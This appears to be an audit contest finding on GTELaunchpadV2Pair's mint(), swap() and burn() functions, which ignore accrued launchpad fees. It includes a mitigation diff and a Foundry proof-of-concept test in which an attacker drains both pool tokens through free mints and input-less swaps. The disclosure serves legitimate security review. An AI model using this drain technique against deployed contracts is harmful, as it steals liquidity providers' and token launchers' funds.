    "body": "## Summary\n\nThe `GTELaunchpadV2Pair` contract contains critical accounting bugs in its `mint()`, `swap()`, and `burn()` functions. These functions fail to properly account for accrued launchpad fees when calculating token amounts, allowing attackers to steal locked assets from the pair.\n\n## Finding Impact\n\n**Impact: High**\n\nThe impact is high because:\n\n1. The vulnerability allows attackers to steal locked assets (both token0 and token1) from any `GTELaunchpadV2Pair` with rewards accrual enabled.\n2. This affects all pairs for the launchpad's launch-quote asset pools for all graduated launch tokens.\n3. The vulnerability can be silently exploited repeatedly until all locked assets are drained.\n4. The attack can drain the entire liquidity pool over time, causing direct financial loss to token launchers (projects partnering with GTE) and other liquidity providers.\n\n## Finding Likelihood\n\n**Likelihood: High**\n\nThe likelihood is high because:\n\n1. The attack requires minimal resources - only gas fees to call `mint()`, `swap()`, or `burn()` on the target pair.\n2. No special conditions need to be met beyond the pair having accrued some fees, which attackers can generate themselves.\n3. The attack can be executed by any external user without special permissions.\n4. The vulnerability is present in core functions that are frequently used. This means that the issue can be accidentally triggered even when the functions are called by normal users (the most likely functions are `mint()` and `burn()`).\n5. The vulnerability affects all pairs that enable rewards accrual (i.e., all pairs for graduated launch tokens), making it widespread across the protocol.\n\n## Finding Description\n\nThe `GTELaunchpadV2Pair` contract contains accounting bugs in three key functions: `mint()`, `swap()`, and `burn()`. These functions fail to properly account for accrued launchpad fees (`accruedLaunchpadFee0` and `accruedLaunchpadFee1`) when calculating token amounts.\n\n### Issue 1: Incorrect calculation in `mint()`\n\nIn the `mint()` function, the calculation of `amount0` and `amount1` does not account for accrued launchpad fees:\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n    function mint(address to) external lock returns (uint256 liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n@>      uint256 amount0 = balance0.sub(_reserve0); //@audit -- Does not account for accruedLaunchpadFee0\n@>      uint256 amount1 = balance1.sub(_reserve1); //@audit -- Does not account for accruedLaunchpadFee1\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        if (liquidity == 0) revert(\"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));\n        if (feeOn) kLast = uint256(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n```\n\nThe issue arises because `_reserve0` and `_reserve1` already account for `accruedLaunchpadFee0` and `accruedLaunchpadFee1` (as you can see in the `_update()` function in the `Root Cause` section below), while `balance0` and `balance1` can contain these accrued fees. This means that if there are no token transfers into the pair, `amount0` will equal `accruedLaunchpadFee0` and `amount1` will equal `accruedLaunchpadFee1`, allowing an attacker to mint liquidity for free.\n\nFurthermore, the issue in this function can even be accidentally triggered when normal users call it.\n\n### Issue 2: Incorrect calculation in `swap()`\n\nIn the `swap()` function, there are two related issues:\n\n1. Incorrect calculation of `amount0In` and `amount1In`\n2. Incorrect calculation of `balance0Adjusted` and `balance1Adjusted`\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {\n        // ... [code omitted for brevity]\n\n@>      uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; //@audit -- Does not account for accruedLaunchpadFee0\n@>      uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; //@audit -- Does not account for accruedLaunchpadFee1\n        if (amount0In == 0 && amount1In == 0) revert(\"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\");\n\n        {\n            // scope for reserve{0,1}Adjusted and launchpadFee{0,1}, avoids stack too deep errors\n@>          uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); //@audit -- Does not account for accruedLaunchpadFee0\n@>          uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3)); //@audit -- Does not account for accruedLaunchpadFee1\n            \n            if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {\n                revert(\"UniswapV2: K\");\n            }\n            // ... [code omitted for brevity]\n        }\n    }\n```\n\nSimilar to the `mint()` function, `_reserve0` and `_reserve1` already account for accrued fees, while `balance0` and `balance1` can contain these fees. This means that if there are no token transfers into the pair, `amount0In` will equal `accruedLaunchpadFee0 + amount0Out` and `amount1In` will equal `accruedLaunchpadFee1 + amount1Out`.\n\nMoreover, the calculation of `balance0Adjusted` and `balance1Adjusted` also fails to account for accrued fees. They can contain larger values than expected because `balance0` and `balance1` may contain accrued fees. As a result, an attacker can swap out tokens for free without transferring in any tokens.\n\n### Issue 3: Incorrect calculation in `burn()`\n\nIn the `burn()` function, the calculation of `amount0` and `amount1` also fails to account for accrued fees:\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n    function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {\n        // ... [code omitted for brevity]\n\n        uint256 balance0 = IERC20(_token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(_token1).balanceOf(address(this));\n        uint256 liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n@>      amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution //@audit -- Does not account for accruedLaunchpadFee0\n@>      amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution //@audit -- Does not account for accruedLaunchpadFee1\n\n        // ... [code omitted for brevity]\n    }\n```\n\nSince `balance0` and `balance1` can contain accrued fees, this results in transferring out more tokens than expected, allowing an attacker to extract more value than they should be entitled to.\n\nFurthermore, the issue in this function can even be accidentally triggered when normal users call it.\n\n### Root Cause\n\nThe root cause of these issues is that the `_update()` function in `GTELaunchpadV2Pair` subtracts accrued fees from balances when calculating reserves:\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n    function _update(\n        uint256 balance0,\n        uint256 balance1,\n        uint112 _reserve0,\n        uint112 _reserve1,\n        uint112 newLaunchpadFee0,\n        uint112 newLaunchpadFee1\n    ) private {\n        // ... [code omitted for brevity]\n\n        // Balances contain both accrued and new launchpad fees earned this tx\n        // as balance is called before any fee distributions, so subtract the total\n@>      reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0; //@audit -- reserve0 already accounts for totalLaunchpadFee0 (accrued fee0)\n@>      reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1; //@audit -- reserve1 already accounts for totalLaunchpadFee1 (accrued fee1)\n        \n        // ... [code omitted for brevity]\n    }\n```\n\nHowever, the `mint()`, `swap()`, and `burn()` functions do not properly account for this when calculating token amounts, leading to the vulnerabilities described.\n\n## Recommended Mitigation Steps\n\nProperly account for accrued fees in all three functions.\n\n```diff\n// In mint() function:\n-   uint256 amount0 = balance0.sub(_reserve0);\n-   uint256 amount1 = balance1.sub(_reserve1);\n+   uint256 amount0 = balance0.sub(_reserve0).sub(accruedLaunchpadFee0);\n+   uint256 amount1 = balance1.sub(_reserve1).sub(accruedLaunchpadFee1);\n\n// In swap() function:\n-   uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n-   uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n+   uint256 amount0In = (balance0 - accruedLaunchpadFee0) > _reserve0 - amount0Out ? (balance0 - accruedLaunchpadFee0) - (_reserve0 - amount0Out) : 0;\n+   uint256 amount1In = (balance1 - accruedLaunchpadFee1) > _reserve1 - amount1Out ? (balance1 - accruedLaunchpadFee1) - (_reserve1 - amount1Out) : 0;\n\n-   uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n-   uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n+   uint256 balance0Adjusted = (balance0.sub(accruedLaunchpadFee0)).mul(1000).sub(amount0In.mul(3));\n+   uint256 balance1Adjusted = (balance1.sub(accruedLaunchpadFee1)).mul(1000).sub(amount1In.mul(3));\n\n// In burn() function:\n-   amount0 = liquidity.mul(balance0) / _totalSupply;\n-   amount1 = liquidity.mul(balance1) / _totalSupply;\n+   amount0 = liquidity.mul(balance0.sub(accruedLaunchpadFee0)) / _totalSupply;\n+   amount1 = liquidity.mul(balance1.sub(accruedLaunchpadFee1)) / _totalSupply;\n```",
    "proof_of_concept": "The PoC demonstrates two attack vectors:\n\n1. `_test_pairBalancesAccountingBug_mintLiquidityForFreeToStealBothLockedAssets()`: This test shows how an attacker can mint liquidity for free and then burn it to steal both token0 and token1 from the pair.\n\n2. `_test_pairBalancesAccountingBug_swapBothLockedAssetsOutForFree()`: This test shows how an attacker can swap out tokens without providing any input tokens, effectively stealing tokens from the pair.\n\nBoth attacks exploit the accounting bugs in the `GTELaunchpadV2Pair` contract's core functions.\n\n*Note: In fact, there's also an attack vector on `burn()` that I didn't include in this PoC due to the lengthy of the report.*\n\n```solidity\n// FILE: test/c4-poc/PoCLaunchpad.t.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\n\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\nimport {Launchpad} from \"contracts/launchpad/Launchpad.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {IBondingCurveMinimal} from \"contracts/launchpad/BondingCurves/IBondingCurveMinimal.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\nimport {LaunchpadLPVault} from \"contracts/launchpad/LaunchpadLPVault.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\n\nimport {ERC1967Factory} from \"@solady/utils/ERC1967Factory.sol\";\n\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\n\nimport {MockUniV2Router} from \"../mocks/MockUniV2Router.sol\";\n\nimport {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\nimport {ICLOBManager} from \"contracts/clob/ICLOBManager.sol\";\nimport {IOperatorPanel} from \"contracts/utils/interfaces/IOperatorPanel.sol\";\n\nimport {UniV2Bytecode} from \"../launchpad/integration/UniV2Bytecode.t.sol\";\n\nimport \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport \"contracts/launchpad/uniswap/interfaces/IGTELaunchpadV2Pair.sol\";\nimport \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\n\nimport {IUniswapV2RouterMinimal} from \"contracts/launchpad/interfaces/IUniswapV2RouterMinimal.sol\";\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport \"@solady/utils/SafeTransferLib.sol\";\n\nimport {Test} from \"lib/forge-std/src/Test.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    GTELaunchpadV2PairFactory gteLaunchpadV2PairFactory;\n\n    // Custom setUp() for this PoC\n    function setUp() public override {\n        quoteToken = new ERC20Harness(\"Quote\", \"QTE\");\n        \n        factory = new ERC1967Factory();\n\n        bytes32 launchpadSalt = bytes32(abi.encode(\"GTE.V1.TESTNET.LAUNCHPAD\", owner));\n\n        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));\n\n        address c_logic = address(new SimpleBondingCurve(address(launchpad)));\n        address v_logic = address(new LaunchpadLPVault());\n\n        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));\n        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));\n\n        address clobManager = makeAddr(\"clob manager\");\n        address operatorAddr = makeAddr(\"operator\");\n        vm.mockCall(\n            operatorAddr,\n            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),\n            abi.encode(0)\n        );\n\n        distributor = address(new Distributor());\n        Distributor(distributor).initialize(address(launchpad));\n\n        // Deploy the GTELaunchpadV2PairFactory instead of the mock UniV2Factory to demonstrate the vulnerability\n        gteLaunchpadV2PairFactory = new GTELaunchpadV2PairFactory(address(this), address(launchpad), address(launchpadLPVault), address(distributor));\n\n        // Use the custom MockUniV2Router2 for this PoC (due to the custom addLiquidity() instead of using the C4's mock function)\n        MockUniV2Router2 uniV2Router2 = new MockUniV2Router2(address(gteLaunchpadV2PairFactory), address(launchpadLPVault), address(distributor));\n\n        address l_logic =\n            address(new Launchpad(address(uniV2Router2), address(0), clobManager, operatorAddr, distributor));\n\n        vm.prank(owner);\n        Launchpad(\n            factory.deployDeterministicAndCall({\n                implementation: l_logic,\n                admin: owner,\n                salt: launchpadSalt,\n                data: abi.encodeCall(\n                    Launchpad.initialize,\n                    (\n                        owner,\n                        address(quoteToken),\n                        address(curve),\n                        address(launchpadLPVault),\n                        abi.encode(200_000_000 ether, 10 ether)\n                    )\n                )\n            })\n        );\n\n        token = _launchToken();\n\n        BONDING_SUPPLY = curve.bondingSupply(token);\n        TOTAL_SUPPLY = curve.totalSupply(token);\n\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        ERC20Harness(token).approve(address(launchpad), type(uint256).max);\n        vm.stopPrank();\n\n        vm.prank(owner);\n        launchpad.updateInitCodeHash(_getInitHash());\n    }\n\n    function _getInitHash() internal pure returns (bytes memory) {\n        bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;\n        return abi.encodePacked(keccak256(abi.encodePacked(bytecode)));\n    }\n\n    // cmd: forge test --match-test submissionValidity\n    function test_submissionValidity() external {\n        uint256 snapshot = vm.snapshotState(); // Saves the state\n\n        // *** Test case 1: Stealing both locked assets (token0 and token1) through the GTELaunchpadV2Pair::mint() ***\n        _test_pairBalancesAccountingBug_mintLiquidityForFreeToStealBothLockedAssets();\n\n        vm.revertToState(snapshot); // Restores the state to cleanup all modified states\n\n        // *** Test case 2: Stealing both locked assets (token0 and token1) through the GTELaunchpadV2Pair::swap() ***\n        _test_pairBalancesAccountingBug_swapBothLockedAssetsOutForFree();\n    }\n\n    function _test_pairBalancesAccountingBug_mintLiquidityForFreeToStealBothLockedAssets() internal {\n        // During the bonding period\n        assertEq(LaunchToken(token).unlocked(), false);\n\n        // In the bonding period, the GTELaunchpadV2Pair is not created yet\n        GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(address(pairFor(address(gteLaunchpadV2PairFactory), token, address(quoteToken), address(launchpadLPVault), address(distributor))));\n        assertEq(isContract(address(pair)), false);\n\n        // User buys a huge amount of base token, making the base token graduate (during the bonding period)\n        uint256 baseAmount = BONDING_SUPPLY;\n        uint256 quoteAmount = curve.quoteQuoteForBase(token, baseAmount, true);\n        quoteToken.mint(user, quoteAmount);\n\n        vm.prank(user);\n        launchpad.buy(\n            ILaunchpad.BuyData({\n                account: user,\n                token: token,\n                recipient: user,\n                amountOutBase: baseAmount,\n                maxAmountInQuote: quoteAmount\n            })\n        );\n\n        // Now, the unbonding period starts\n        assertEq(LaunchToken(token).unlocked(), true);\n\n        // The pair has been created with the rewardsPoolActive == 1 (activated)\n        assertEq(isContract(address(pair)), true);\n        assertEq(pair.rewardsPoolActive(), 1);\n\n        // Generate some fees to demonstrate the vulnerability\n        {\n            // User swaps quote token for base token via the pair (quote token fee accrual is expected)\n            uint256 amountIn = 10 ether;\n            quoteToken.mint(user, amountIn);\n\n            (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(quoteToken));\n\n            uint112 accruedFeeTokenBefore = pair.accruedLaunchpadFee1();\n            uint112 accruedFeeQuoteBefore = pair.accruedLaunchpadFee0();\n\n            vm.startPrank(user);\n            quoteToken.transfer(address(pair), amountIn);\n\n            // Swap: quote token -> base token\n            pair.swap(amount0Out, amount1Out, user, hex\"\");\n            vm.stopPrank();\n\n            uint112 accruedFeeTokenAfter = pair.accruedLaunchpadFee1();\n            uint112 accruedFeeQuoteAfter = pair.accruedLaunchpadFee0();\n\n            assertEq(accruedFeeTokenAfter - accruedFeeTokenBefore, 0); // ==\n            assertGt(accruedFeeQuoteAfter - accruedFeeQuoteBefore, 0); // > (quote reward accrued)\n\n            // Now, the user swaps base token for quote token via the pair (base token fee accrual is expected)\n            amountIn = 10 ether;\n            (amount0Out, amount1Out) = getAmountsOut(pair, amountIn, address(token));\n\n            accruedFeeTokenBefore = pair.accruedLaunchpadFee1();\n            accruedFeeQuoteBefore = pair.accruedLaunchpadFee0();\n\n            vm.startPrank(user);\n            LaunchToken(token).transfer(address(pair), amountIn);\n\n            // Swap: base token -> quote token\n            pair.swap(amount0Out, amount1Out, user, hex\"\");\n            vm.stopPrank();\n\n            accruedFeeTokenAfter = pair.accruedLaunchpadFee1();\n            accruedFeeQuoteAfter = pair.accruedLaunchpadFee0();\n\n            assertGt(accruedFeeTokenAfter - accruedFeeTokenBefore, 0); // > (base reward accrued)\n            // assertEq(accruedFeeQuoteAfter - accruedFeeQuoteBefore, 0); // this assertion is not true due to the side effect of this reporting bug\n\n            assertGt(pair.accruedLaunchpadFee1(), 0); // Base reward accrued\n            assertGt(pair.accruedLaunchpadFee0(), 0); // Quote reward accrued\n        }\n\n        // The attack begins...\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n\n        {\n            uint256 attackerLpBalancePrev = pair.balanceOf(attacker);\n            for (uint256 i = 0; i < 1000; i++) {\n                // Attacker mints liquidity for free (no token transfers in for minting)\n                uint256 liquidity = pair.mint(attacker); // Mint liquidity for free\n                assertGt(liquidity, 0);\n\n                uint256 attackerLpBalanceNow = pair.balanceOf(attacker);\n                assertGt(attackerLpBalanceNow, attackerLpBalancePrev);\n\n                attackerLpBalancePrev = attackerLpBalanceNow;\n            }\n        }\n\n        uint256 attackerTokenBalanceBefore = LaunchToken(token).balanceOf(address(attacker));\n        uint256 attackerQuoteBalanceBefore = quoteToken.balanceOf(address(attacker));\n\n        // Steal base token and quote token\n        pair.transfer(address(pair), pair.balanceOf(attacker));\n        pair.burn(attacker);\n        vm.stopPrank();\n\n        uint256 attackerTokenBalanceAfter = LaunchToken(token).balanceOf(address(attacker));\n        uint256 attackerQuoteBalanceAfter = quoteToken.balanceOf(address(attacker));\n\n        // Proof of the profit\n        assertGt(attackerTokenBalanceAfter - attackerTokenBalanceBefore, 0); // > (stole base token)\n        assertGt(attackerQuoteBalanceAfter - attackerQuoteBalanceBefore, 0); // > (stole quote token)\n    }\n\n    function _test_pairBalancesAccountingBug_swapBothLockedAssetsOutForFree() internal {\n        // During the bonding period\n        assertEq(LaunchToken(token).unlocked(), false);\n\n        // In the bonding period, the GTELaunchpadV2Pair is not created yet\n        GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(address(pairFor(address(gteLaunchpadV2PairFactory), token, address(quoteToken), address(launchpadLPVault), address(distributor))));\n        assertEq(isContract(address(pair)), false);\n\n        // User buys a huge amount of base token, making the base token graduate (during the bonding period)\n        uint256 baseAmount = BONDING_SUPPLY;\n        uint256 quoteAmount = curve.quoteQuoteForBase(token, baseAmount, true);\n        quoteToken.mint(user, quoteAmount);\n\n        vm.prank(user);\n        launchpad.buy(\n            ILaunchpad.BuyData({\n                account: user,\n                token: token,\n                recipient: user,\n                amountOutBase: baseAmount,\n                maxAmountInQuote: quoteAmount\n            })\n        );\n\n        // Now, the unbonding period starts\n        assertEq(LaunchToken(token).unlocked(), true);\n\n        // The pair has been created with the rewardsPoolActive == 1 (activated)\n        assertEq(isContract(address(pair)), true);\n        assertEq(pair.rewardsPoolActive(), 1);\n\n        // User swaps quote token for base token via the pair (quote token fee accrual is expected)\n        // (Generate some fees to demonstrate the vulnerability)\n        {\n            uint256 amountIn = 10 ether;\n            quoteToken.mint(user, amountIn);\n\n            (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(quoteToken));\n\n            uint112 accruedFeeTokenBefore = pair.accruedLaunchpadFee1();\n            uint112 accruedFeeQuoteBefore = pair.accruedLaunchpadFee0();\n\n            vm.startPrank(user);\n            quoteToken.transfer(address(pair), amountIn);\n\n            // Swap: quote token -> base token\n            pair.swap(amount0Out, amount1Out, user, hex\"\");\n            vm.stopPrank();\n\n            uint112 accruedFeeTokenAfter = pair.accruedLaunchpadFee1();\n            uint112 accruedFeeQuoteAfter = pair.accruedLaunchpadFee0();\n\n            assertEq(accruedFeeTokenAfter - accruedFeeTokenBefore, 0); // ==\n            assertGt(accruedFeeQuoteAfter - accruedFeeQuoteBefore, 0); // > (quote reward accrued)\n        }\n\n        // The attack begins...\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n\n        uint256 attackerTokenBalanceBefore = LaunchToken(token).balanceOf(address(attacker));\n        uint256 attackerQuoteBalanceBefore = quoteToken.balanceOf(address(attacker));\n\n        {\n            uint256 attackerQuoteBalancePrev = quoteToken.balanceOf(address(attacker));\n            for (uint256 i = 0; i < 100; i++) {\n                // Attacker swaps base token for quote token via the pair\n                // with zero (base) token transfer in (to steal quote token)\n                uint256 amountIn = 10000 ether;\n                (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(token));\n\n                // One-sided swap: base token -> quote token\n                pair.swap(amount0Out, amount1Out, attacker, hex\"\");\n\n                uint256 attackerQuoteBalanceNow = quoteToken.balanceOf(address(attacker));\n                assertGt(attackerQuoteBalanceNow, attackerQuoteBalancePrev);\n\n                attackerQuoteBalancePrev = attackerQuoteBalanceNow;\n            }\n        }\n\n        vm.stopPrank();\n        uint256 attackerTokenBalanceAfter = LaunchToken(token).balanceOf(address(attacker));\n        uint256 attackerQuoteBalanceAfter = quoteToken.balanceOf(address(attacker));\n\n        // Proof of the profit\n        //\n        // This PoC demonstrates the attack on the one-sided swap only (base token -> quote token) for brevity\n        // Note: the attacker can actually use the same technique to steal base token\n        assertEq(attackerTokenBalanceAfter - attackerTokenBalanceBefore, 0); // == (this PoC demonstrates the attack on the one-sided swap only)\n        assertGt(attackerQuoteBalanceAfter - attackerQuoteBalanceBefore, 0); // > (stole quote token)\n    }\n\n    function getAmountsOut(GTELaunchpadV2Pair pair, uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 amount0Out, uint256 amount1Out)\n    {\n        bool isZeroTokenIn = tokenIn == pair.token0();\n\n        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();\n\n        (uint256 reserveIn, uint256 reserveOut) = isZeroTokenIn ? (reserve0, reserve1) : (reserve1, reserve0);\n        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n        (amount0Out, amount1Out) = isZeroTokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));\n    }\n\n    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountOut)\n    {\n        require(amountIn > 0, \"UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n        amountOut = numerator / denominator;\n    }\n\n    function pairFor(address factory, address tokenA, address tokenB, address launchpadLp, address launchpadFeeDistributor) internal view returns (IUniswapV2Pair pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = IUniswapV2Pair(\n            address(\n                uint160(\n                    uint256(\n                        keccak256(\n                            abi.encodePacked(\n                                hex\"ff\",\n                                factory,\n                                keccak256(abi.encodePacked(token0, token1, launchpadLp, launchpadFeeDistributor)),\n                                _getInitHash() // uniV2InitCodeHash\n                            )\n                        )\n                    )\n                )\n            )\n        );\n    }\n\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        if (tokenA == tokenB) revert(\"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        if (token0 == address(0)) revert(\"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function isContract(address _addr) private returns (bool) {\n        uint32 size;\n        assembly {\n            size := extcodesize(_addr)\n        }\n        return (size > 0);\n    }\n}\n\ncontract MockUniV2Router2 is IUniswapV2RouterMinimal, Test {\n    using SafeTransferLib for address;\n\n    bool public constant IS_SCRIPT = true;\n    address private immutable _factory;\n    address private immutable _launchpadLPVault;\n    address private immutable _distributor;\n\n    constructor(address factory_, address launchpadLPVault_, address distributor_) {\n        _factory = factory_;\n        _launchpadLPVault = launchpadLPVault_;\n        _distributor = distributor_;\n    }\n\n    function factory() external view returns (address) {\n        return _factory;\n    }\n\n    // Custom addLiquidity() for this PoC (instead of using the C4's mock function)\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity) {\n        address pair = address(pairFor(_factory, tokenA, tokenB, _launchpadLPVault, _distributor));\n        MockERC20(tokenA).transferFrom(msg.sender, pair, amountADesired);\n        MockERC20(tokenB).transferFrom(msg.sender, pair, amountBDesired);\n\n        IUniswapV2Pair(pair).mint(to);\n\n        if (block.timestamp > deadline) revert(\"expired\");\n\n        return (0, 0, 0);\n    }\n\n    function pairFor(address factory, address tokenA, address tokenB, address launchpadLp, address launchpadFeeDistributor) internal view returns (IUniswapV2Pair pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = IUniswapV2Pair(\n            address(\n                uint160(\n                    uint256(\n                        keccak256(\n                            abi.encodePacked(\n                                hex\"ff\",\n                                factory,\n                                keccak256(abi.encodePacked(token0, token1, launchpadLp, launchpadFeeDistributor)),\n                                _getInitHash() // uniV2InitCodeHash\n                            )\n                        )\n                    )\n                )\n            )\n        );\n    }\n\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        if (tokenA == tokenB) revert(\"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        if (token0 == address(0)) revert(\"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function _getInitHash() internal pure returns (bytes memory) {\n        bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;\n        return abi.encodePacked(keccak256(abi.encodePacked(bytecode)));\n    }\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256, /*amountOutMin*/\n        address[] calldata path,\n        address to,\n        uint256 /*deadline*/\n    ) external returns (uint256[] memory amounts) {\n        path[0].safeTransferFrom(msg.sender, address(this), amountIn);\n\n        amounts = getAmountsOut(amountIn, path);\n\n        address target = path[path.length - 1];\n\n        uint256 tokens = amounts[amounts.length - 1];\n\n        try ERC20Harness(target).mint(to, tokens) {}\n        catch {\n            vm.prank(msg.sender);\n            try LaunchToken(target).mint(tokens) {}\n            catch {\n                revert(\"cant mint mock token for swap. is not an ERC20 harness or LaunchToken\");\n            }\n        }\n    }\n\n    function swapTokensForExactTokens(uint256 amountOut, uint256, address[] calldata path, address to, uint256)\n        external\n        returns (uint256[] memory amounts)\n    {\n        uint256 amountIn = getAmountIn(amountOut, 0, 0);\n\n        path[0].safeTransferFrom(msg.sender, address(this), amountIn);\n\n        address target = path[path.length - 1];\n\n        amounts = new uint256[](2);\n        amounts[0] = amountIn;\n        amounts[1] = amountOut;\n\n        try ERC20Harness(target).mint(to, amountOut) {}\n        catch {\n            vm.prank(msg.sender);\n            try LaunchToken(target).mint(amountOut) {}\n            catch {\n                revert(\"cant mint mock token for swap. is not an ERC20 harness or LaunchToken\");\n            }\n        }\n    }\n\n    function getAmountIn(uint256 amountOut, uint256, uint256) public pure returns (uint256 amountIn) {\n        amountIn = amountOut - amountIn * 1 ether / 0.5 ether;\n    }\n\n    function getAmountsOut(uint256 amountIn, address[] memory /*path*/ )\n        public\n        pure\n        returns (uint256[] memory amounts)\n    {\n        amounts = new uint256[](2);\n        amounts[0] = amountIn;\n        amounts[1] = amountIn + amountIn * 0.5 ether / 1 ether;\n    }\n}\n```",
